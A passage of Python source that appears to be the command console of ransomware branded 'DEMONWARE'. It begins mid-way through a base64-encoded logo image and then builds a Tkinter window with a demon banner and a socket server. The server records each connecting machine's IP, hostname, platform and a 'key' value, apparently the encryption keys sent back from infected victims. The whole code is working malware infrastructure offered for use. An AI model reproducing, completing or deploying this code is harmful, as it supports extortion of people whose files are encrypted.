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'''

        # Canvas for image
        canvas = Canvas(self, highlightthickness=0, height = 150, width = 500, background = 'white')
        canvas.grid(row=0, column=0, columnspan = 4)

        #photo = PhotoImage(file='logo2.png')
        #photo = PhotoImage(data=photo_code)
        #photo = ImageTk.PhotoImage(Image.open(data = photo_code))
        photo = PIL.ImageTk.PhotoImage(PIL.Image.open(BytesIO(base64.b64decode(photo_code))))
        #photo = photo.zoom(2)
        #photo = photo.subsample(1)
        label = Label(self, image=photo)
        label.image = photo # keep a reference!
        label.grid(row = 0, column = 0)

        label2 = Label(self, image=photo)
        label2.image = photo # keep a reference!
        label2.grid(row = 0, column = 3)


        # Log Frame
        result = LabelFrame(self, text = 'Log', relief = GROOVE)
        result.grid(row = 1, column = 0, rowspan = 4, columnspan = 4)
        self.options['log'] = Text(result, foreground="white", background="black", highlightcolor="white", highlightbackground="black", height = 35, width = 120)
        self.options['log'].grid(row = 0, column = 1)

        # Tags
        self.options['log'].tag_configure('yellow', foreground='yellow')
        self.options['log'].tag_configure('red', foreground='red')
        self.options['log'].tag_configure('deeppink', foreground='deeppink')
        self.options['log'].tag_configure('orange', foreground='orange')
        self.options['log'].tag_configure('green', foreground='green')
        self.options['log'].tag_configure('bold', font='bold')

        #self.options['log'].insert('1.0', 'Set Hosts, range and script, then click Scan!\n', 'bold')

        # Bottom input fields:
        Label(self, text = 'Host: ', background = 'white').grid(row = 5, column = 0)
        Entry(self, textvariable = self.options['host']).grid(row = 5, column = 1)

        Label(self, text = 'Port: ', background = 'white').grid(row = 5, column = 2)
        Entry(self, textvariable = self.options['port']).grid(row = 5, column = 3)

        # Bottom buttons
        start_server = Button(self, text = "START SERVER", command = self.start_thread, width = 53).grid(row = 6, column = 0, columnspan = 2)
        #stop_server = Button(self, text = "STOP SERVER", command = self.scan, width = 53).grid(row = 4, column = 1, columnspan = 2)
        exit = Button(self, text = "EXIT", command = self.destroy, width = 53).grid(row = 6, column = 2, columnspan = 2)

        header = 'Remote'.ljust(20), 'Local'.ljust(20), 'Platform'.ljust(20), 'key'
        self.options['log'].insert('1.0', '{0[0]} {0[1]} {0[2]} {0[3]}'.format(header), 'green')

    def start_thread(self):
        #self.enter_data.destroy()

        # Start server as thread
        thread = threading.Thread(target=self.start_server)
        thread.daemon = True
        thread.start()

    def start_server(self):
        host = self.options['host'].get()
        port = self.options['port'].get()
        socket_list = []

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((host, port))
        server_socket.listen(10)

        # add server socket object to the list of readable connections
        socket_list.append(server_socket)

        self.insert_banner()
        self.options['log'].insert('1.0', "Server started on port [%s] [%s]\nWaiting...\n" % (host, int(port)), 'deeppink')

        try:
            while True:
                ready_to_read,ready_to_write,in_error = select.select(socket_list,[],[],0)

                for sock in ready_to_read:
                    # a new connection request recieved
                    if sock == server_socket:
                        sockfd, addr = server_socket.accept()
                        socket_list.append(sockfd)
                    else:
                        try:
                            data = sock.recv(1024)
                            if data:
                                data = data.decode('UTF-8')
                                ip = addr[0]
                                local = data.split('$')[0]
                                system = data.split('$')[1]
                                key = data.split('$')[2]

                                self.options['log'].insert(END, '\n[%s %s] %s %s %s %s\n' % (time.strftime('%d/%m/%Y'), time.strftime('%X'), ip.ljust(20), local.ljust(20), system.ljust(20), key), 'yellow')
                                self.options['log'].see(END)

                            else:
                                if sock in socket_list:
                                    socket_list.remove(sock)
                        except:
                            continue
        except KeyboardInterrupt:
            print('Closed...\n')


        server_socket.close()

    def exit(self, event):
        sys.exit(0)

    #def set_options(self):
    #    self.enter_data = Toplevel()
    #    self.enter_data.title(string = 'Enter Host and Port')
    #    self.enter_data.resizable(0,0)

    #    Label(self.enter_data, text = 'Host: ').grid(row = 0, column = 1)
    #    self.options['host'] = Entry(self.enter_data, textvariable = self.options['host'])
    #    self.options['host'].grid(row = 0, column = 2)

    #    Label(self.enter_data, text = 'Port: ').grid(row = 1, column = 1)
    #    self.options['port'] = Entry(self.enter_data, textvariable = self.options['port'])
    #    self.options['port'].grid(row = 1, column = 2)

    #    self.options['port'].bind('<Return>', self.start_thread)
    #    self.options['host'].focus()

    def insert_banner(self):
        banner = '''
                         .:'                                  `:.
                         ::'                                    `::
                        :: :.                                  .: ::
                         `:. `:.             .             .:'  .:'
                          `::. `::           !           ::' .::'
                              `::.`::.    .' ! `.    .::'.::'
                                `:.  `::::'':!:``::::'   ::'
                                :'*:::.  .:' ! `:.  .:::*`:
                               :: HHH::.   ` ! '   .::HHH ::
                              ::: `H TH::.  `!'  .::HT H' :::
                              ::..  `THHH:`:   :':HHHT'  ..::
                              `::      `T: `. .' :T'      ::'
                                `:. .   :         :   . .:'
                                  `::'               `::'
                                    :'  .`.  .  .'.  `:
                                    :' ::.       .:: `:
                                    :' `:::     :::' `:
                                     `.  ``     ''  .'
                                      :`...........':
                                      ` :`.     .': '
                                       `:  `"""'  :'
         ______   _______  _______  _______  _                 _______  _______  _______
        (  __  \ (  ____ \(       )(  ___  )( (    /||\     /|(  ___  )(  ____ )(  ____ \\
        | (  \  )| (    \/| () () || (   ) ||  \  ( || )   ( || (   ) || (    )|| (    \/
        | |   ) || (__    | || || || |   | ||   \ | || | _ | || (___) || (____)|| (__
        | |   | ||  __)   | |(_)| || |   | || (\ \) || |( )| ||  ___  ||     __)|  __)
        | |   ) || (      | |   | || |   | || | \   || || || || (   ) || (\ (   | (
        | (__/  )| (____/\| )   ( || (___) || )  \  || () () || )   ( || ) \ \__| (____/\\
        (______/ (_______/|/     \|(_______)|/    )_)(_______)|/     \||/   \__/(_______/
        '''

        self.options['log'].insert('1.0', banner + '\n', 'red')

main = MainWindow()
main.mainloop()
